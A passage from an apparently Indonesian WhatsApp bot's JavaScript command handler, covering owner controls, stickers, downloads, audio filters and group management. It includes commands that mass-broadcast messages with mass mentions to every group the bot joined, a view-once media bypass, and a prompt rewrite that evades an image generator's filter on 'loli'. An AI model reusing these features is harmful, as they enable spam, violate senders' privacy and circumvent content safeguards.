    global.setmenu = "v2"
    } else {
    m.reply("Ex: .setmenu v1 / v2")
    }
    break
    
    case "setreply":
    if (!isCreator) return 
    if (text === "v1") {
    m.reply("Succes")
    global.setreply = "v1"
    } else if (text === "v2") {
    m.reply("Succes")
    global.setreply = "v2"
    } else if (text === "v3") {
    m.reply("Succes")
    global.setreply = "v3"
    } else if (text === "v4") {
    m.reply("Succes")
    global.setreply = "v4"
    } else {
    m.reply("Ex: .setreply v1 / v2 / v3 / v4")
    }
    break
case 'block':
if (!isCreator) return m.reply("Kamu Bukan Owner");
if(isGroup){
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(users){
await ptz.updateBlockStatus(users, "block")
m.reply(`Sukses block user`)
} else {
m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return m.reply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ptz.updateBlockStatus(woke, "block")
} else if(!q){
m.reply("Masukan nomer yang ingin di block")
}
m.reply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
case 'unblock':
if (!isCreator) return m.reply("Kamu Bukan Owner");
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await ptz.updateBlockStatus(users, "unblock")
await m.reply(`Sukses unblock user`)
} else if(!q){
m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return m.reply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return m.reply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ptz.updateBlockStatus(woke, "unblock")
m.reply(`Sukses unblock ${woke}`)
} else if(!q){
m.reply("Masukan nomer yang ingin di unblock")
}

}
break
case 'setppbot':{
if (!isCreator) return m.reply("Kamu Bukan Owner");
if(m.quoted){
const media = await ptz.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await ptz.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await m.reply(`Done`)
} else m.reply("Reply fotonya")
}
break
case 'delppbot': {
if (!isCreator) return m.reply("Kamu Bukan Owner");
ptz.removeProfilePicture(ptz.user.id)
m.reply("Done")
}
break
case 'setbiobot':{
if (!isCreator) return m.reply("Kamu Bukan Owner");
if (!q) return m.reply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await ptz.updateProfileStatus(q)
await m.reply(`Berhasil mengganti status bio ke *${q}*`)
}
break
case 'join': {
if (!isCreator) return m.reply("Kamu Bukan Owner")
if (!text) return m.reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ptz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break        
        //======//
        case "public":
         if (!isCreator) return 
        ptz.public = true 
        m.reply("Done")
        break
        
        case "self":
        if (!isCreator) return 
        ptz.public = false
        m.reply("Done")
        break
        
        case 'getcase':
 if (!isCreator) return 
if (!q) return reply(`Contoh penggunaan: ${prefix+command} menu`)
const getcase = (cases) => {
return "case "+`'${cases}'`+fs.readFileSync('./message.js').toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
reply(`${getcase(q)}`)
break
case 'getfunc':
if (!isCreator) return 
if (!q) return reply(`Contoh penggunaan: ${prefix+command} const reply`)
const getfunc = (funcc) => {
return `'${funcc}'`+fs.readFileSync('./message.js').toString().split(`+funcc+`)[1].split('')
}
reply(`${getfunc(q)}`)
break

case "delfile":
if (!isCreator) return 
if (!text) return m.reply("Ex: .delfile ./database/prem.json")
fs.unlinkSync(text)
m.reply ("Done")
break

case 'delfolder':
if (!isCreator) return 
if (!text) return reply(`*Ex* : ${prefix + command} ./session2`)
rimraf.sync(`${text}`)
reply(`Berhasil hapus folder ${q}`)
break

 case 'gfl': case "gantifile":{
if (!isCreator) return 
if (!text.includes("./")) return m.reply(`*Example* : ${prefix + command} ./package.json`)
let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
if (!files.includes(m.quoted.fileName)) return reply("File not found") 
let media = await downloadContentFromMessage(m.quoted, "document")
let buffer = Buffer.from([])
for await(const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
fs.writeFileSync(text, buffer)
m.reply(`Mengupload`)
await sleep(2000)
reply(`Berhasil mengganti file ${q}`)
}
break
        //=====//
 case "rpgmon": case "rpgmenu":
 reply (`
╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  R P G - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴘɪɴ
│  ◦  .ʙᴇʀʙᴜʀᴜ
│  ◦  .ᴍɪɴɪɴɢ
│  ◦  .ɢʟᴏʙᴀʟ
│  ◦  .ᴜꜱᴇ-ᴘᴏᴡᴇʀ
│  ◦  .ꜱᴇʟʟ
│  ◦  .ɪɴᴠᴇɴᴛᴏʀʏ
│  ◦  .ʙᴜʏ
│  ◦  .ᴘʀᴏꜰɪʟᴇ
│  ◦  .ᴊᴏɪɴʀᴘɢ
│  ◦  .ᴇxɪᴛʀᴘɢ
│  ◦  .ᴄʀᴇᴀᴛᴇɢᴜɪʟᴅ
│  ◦  .ʟɪꜱᴛɢᴜɪʟᴅ
│  ◦  .ᴊᴏɪɴɢᴜɪʟᴅ
│  ◦  .ᴅᴇʟɢᴜɪʟᴅ
│  ◦  .ɢᴜɪʟᴅɪɴꜰᴏ
│  ◦  .ᴍʏɢᴜɪʟᴅ
│  ◦  .ʙᴀᴛᴛʟᴇ *<628xxx>*
│  ◦  .ᴀᴄᴄ-ʙᴀᴛᴛʟᴇ
│  ◦  .ʀᴇᴊᴇᴄ-ʙᴀᴛᴛʟᴇ
│  ◦  .ʟᴜᴄᴋʏᴅᴀʏ
│  ◦  .ᴅᴀɪʟʏ
│  ◦  .ᴡᴇᴇᴋʟʏ
│  ◦  .ʏᴇᴀʀʟʏ
│  ◦  .ᴍᴀɴᴄɪɴɢ
│  ◦  .ꜱᴇᴛɴᴀᴍᴇ
│  ◦  .ɢɪᴠᴇ-ꜰᴏᴏᴅ
│  ◦  .ʀᴇᴄᴏᴠᴇʀ
│  ◦  .ꜱʟᴇᴇᴘ
│  ◦  .ʙᴇʀᴍᴀɪɴ
│  ◦  .ʟᴀᴛɪʜ-ᴅɪɢɪᴍᴏɴ
│  ◦  .ᴍʏᴅɪɢɪ
│  ◦  .ᴄʜᴇᴀᴛ
│  ◦  .ᴄᴀʀɪ-ʀᴘɢ
│  ◦  .ᴍᴜꜱᴜʜ
│  ◦  .ᴍᴜʟᴜɴɢ
│  ◦  .ʜᴀᴜʟɪɴɢ
│  ◦  .ᴋᴜʀɪʀ
│  ◦  .ɢᴇᴛᴅɪɢɪ
│  ◦  .ʟᴀᴍᴀʀ-ᴋᴇʀᴊᴀ
│  ◦  .ᴏᴜᴛ-ᴋᴇʀᴊᴀ
│  ◦  .ᴘᴏʟɪꜱɪ
│  ◦  .ᴏᴊᴇᴋ
│  ◦  .ᴅᴏᴋᴛᴇʀ
│  ◦  .ᴘᴇᴛᴀɴɪ
│  ◦  .ᴘᴇɴᴅᴀɢᴀɴɢ
│  ◦  .ʟɪꜱᴛ-ꜱᴋɪʟ
│  ◦  .ᴅ-ᴛᴇʀᴍɪɴᴀʟ
│  ◦  .ᴅ3
│  ◦  .ʀᴜʟᴇꜱ-ʀᴘɢ
│  ◦  .ɢᴜɪᴅᴇ-ʀᴘɢ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
 break
    case 'owner': case 'crator':{
ptz.sendMessage(m.chat, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
            newsletterJid: '120363294187887035@newsletter',
            serverMessageId: null,
            newsletterName: '- Vemon • Chanels -'
        },
}}, { quoted: m })
}
        break    
        
        case 'addprem':{
if (!isCreator) return reply(`Hanya Untuk Owner`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} Penggunaan : *.addprem* 628xxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ptz.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
case "delprem":{
if (!isCreator) return reply(`Hanya Untuk Owner`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
        
case 'listpremium': case 'listprem': {
teks = '*`[ L I S T - P R E M I U M ]`*\n\n'
for (let ptz of prem) {
teks += `- ${ptz}\n`
}
teks += `\n*Total : ${prem.length}*`
ptz.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
}
    break
            
 case 'textimg': case 'txt2img':
if (!text) return reply(`Example: .${command} rain on road`)
let anu = await fetch(`https://widipe.com/ai/text2img?text=${text}`)
await ptz.sendMessage(m.chat, {image: {url:anu}, caption: `masih error ${text}`},{quoted:fsaluran})
break      
        case "pushkontakmenu": case "pushkontak": case "pushkontakmon":
        let cg = `
╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P U S H - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴄᴇᴋɪᴅɢᴄ
│  ◦  .ʟɪꜱᴛɢʀᴏᴜᴘ
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ1
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ2
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ3
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ4
│  ◦  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1
│  ◦  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│  ◦  .ɢᴇᴛᴄᴏɴᴛᴀᴄᴛ
│  ◦  .ꜱᴇɴᴅᴋᴏɴᴛᴀᴋ
│  ◦  .ᴊᴘᴍ
│  ◦  .ʙᴄɢᴄ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`
        reply (cg)
        break
        case "ramlist": case "listram":
        let ckckk = `*${m2}[ LIST RAM TERSEDIA ]${m2}*
 ‎‎⟢• ─────────── •⟢
│ 1gb     ••      ☑️
│ 2gb     ••      ☑️
│ 3gb     ••      ☑️
│ 4gb     ••      ☑️
│ 5gb     ••      ☑️
│ 6gb     ••      ☑️
│ 7gb     ••      ☑️
│ 8gb     ••      ☑️
│ unli     ••      ☑️
 ‎‎⟢• ─────────── •⟢`
reply (ckckk)
break
        case "tagall":
let teks0 = `〘      *Tag All*     〙
 •• *Pesan : ${q ? q : 'kosong'}* ••\n\n`
for (let mem of participants) {
teks0 += `☌  @${mem.id.split("@")[0]}\n`
}
ptz.sendMessage(m.chat, { text: teks0, mentions: participants.map(a => a.id) }, { quoted: fsaluran})
break
case 'hidetag': case 'ht': {
ptz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

        case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('Khusus owner')
await loading()
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} Update Veemon Md !`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat.`)
for (let i of anu) {
await sleep(1500)
ptz.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
   case 'jpm':{
if (!isCreator) return reply("?")
if (!text) return replygcxeon(`*Salah Format*\n${prefix+command} text|jeda\nReply foto untuk di jpm Kasih jeda, 1000 = 1 detik\n\nExample: ${prefix + command} kris siamang tunggal|4000`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ptz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)
await ptz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await ptz.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break
        
 /* ################# Thaks ############### */
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
//=================================================//
case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
/*ase "ai":{
if (!text) return reply("mau nanya apa sama naw")
let { data } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
reply(data.result)
}
break*/
//=================================================//
case "gemini-img":{
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("hanya support gambar")
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let urlgambar = await TelegraPH(media)
let { data } = await axios.get("https://gmni.vercel.app/api/img?imageUrl="+ urlgambar +"&prompt=" + text)
reply(data.text)
}
break
//=================================================//
case "gemini":{
if (!text) return reply("mau nanya apa sama naw")
let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
reply(data.text)
}
break
//=================================================//
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply(`balas gambar dengan perintah .ocr`)
if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await ptz.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await m.reply(hasil.ParsedResults[0].ParsedText)
}
break
//=================================================//
case "stickers":{
if (!text) return m.reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await ptz.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "tr":{
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return reply(`Error : Bahasa"${lang}" Tidak Support`)
reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break
//=================================================//
/*case 'ss': case 'ssweb':{
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
ptz.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:fsaluran})
}
break*/
//=================================================//
case "kalkulator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return m.reply("reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
m.reply('error')
}}
break
//=================================================//
case "jarak":{
var [fromf, to] = text.split`|`
if (!(fromf && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(fromf, to)
if (data.img) return ptz.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted:fsaluran })
else reply(data.desc)
}
break
//=================================================//

//=================================================//
case 'cls': {
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) ptz.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
//=================================================//
case 'tts':{
if (!text) return reply(`[ ! ] ${prefix}${command} halo world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
ptz.sendMessage(m?.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
//=================================================//
case 'remini':{
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("hanya support gambar")
let media = await quoted.download()
const This = await remini(media, "enhance");
ptz.sendFile(m?.chat, This, "", "Done", m);
}
break
//=================================================//
case 'tiktok':
case 'tt': {
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok2(`${text}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
}
break
//=================================================//
case "get": {
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return ptz.sendFile(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © Reivaldo`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
reply(txt.slice(0, 65536) + '')
}
}
break
//=================================================//
case 'readvo': case 'readviewonce': {
if (!m?.quoted) return reply('reply gambar/video yang ingin Anda lihat')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('Ini bukan pesan view-once.')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@adiwajshing/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break
//=================================================//
case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else reply("Input teks atau reply teks yang ingin di jadikan quote!")
if (!text) return reply('masukan text')
if (text.length > 30) return reply('Maksimal 30 Teks!')
let ppnyauser = await await ptz.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
ptz.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return reply(respond)
if (!text) return reply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ptz.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await ptz.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
}
break
 //=================================================//
case 'swm': {
let [teks1, teks2] = text.split`|`
if (!teks1) return reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (!teks2) return reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (/image/.test(mime)) {
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case "bingimg-2d": {
if (!text) return reply("[ ! ] masukan prompt gambar yang mau di bikin");
let teksu = text.replace(/loli/gi, "anak gadis kecil");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
ptz.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted:fsaluran });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await reply('No images found after filtering.');
}
} catch (error) {
await reply('An error occurred while processing the request.');
}
};
break
//=================================================//
case "ping":
case "botstatus":
case "statusbot": {
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();
